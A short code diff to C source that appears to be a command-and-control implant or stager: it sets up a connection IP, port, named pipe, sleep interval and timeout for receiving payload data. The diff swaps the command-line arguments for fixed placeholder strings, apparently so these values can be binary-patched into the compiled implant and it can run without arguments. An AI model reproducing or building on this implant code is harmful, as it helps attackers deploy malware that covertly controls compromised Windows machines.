@@ -222,10 +222,10 @@ void write_frame(HANDLE my_handle, char * buffer, DWORD length) {
 void main(int argc, char* argv[])
 {
 	// Set connection info
-	if (argc != 6)
+	if (argc != 1)
 	{
 		debug_print("Incorrect number of args: %d\n", argc);
-		debug_print("Incorrect number of args: %s [IP] [PORT] [PIPE_STR] [SLEEP] [TIMEOUT]\n", argv[0]);
+		debug_print("Incorrect number of args: %s\n", argv[0]);
 		exit(1);
 	}
 
@@ -233,17 +233,22 @@ void main(int argc, char* argv[])
 	SetErrorMode(SEM_FAILCRITICALERRORS | SEM_NOGPFAULTERRORBOX);
 	// _set_abort_behavior(0,_WRITE_ABORT_MSG);
 
-	char* IP = argv[1];
-	char* PORT = argv[2];
+	//char* IP = argv[1];
+	char IP[50] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
+	//char* PORT = argv[2];
+	char PORT[50] = "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB";
 	
-	char pipe_str[50];
-	strncpy(pipe_str, argv[3], sizeof(pipe_str));
+	char pipe_str[50] = "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC";
+	//strncpy(pipe_str, argv[3], sizeof(pipe_str));
 
 	int sleep;
-	sleep = atoi(argv[4]);
+	//sleep = atoi(argv[4]);
+	sleep = atoi("DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD");
+
 
 	int TIMEOUT_SEC;
-	TIMEOUT_SEC = atoi(argv[5])*1000;
+	//TIMEOUT_SEC = atoi(argv[5])*1000;
+	TIMEOUT_SEC = atoi("EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE")*1000;
 
 	DWORD payloadLen = 0;
 	char* payloadData = NULL;
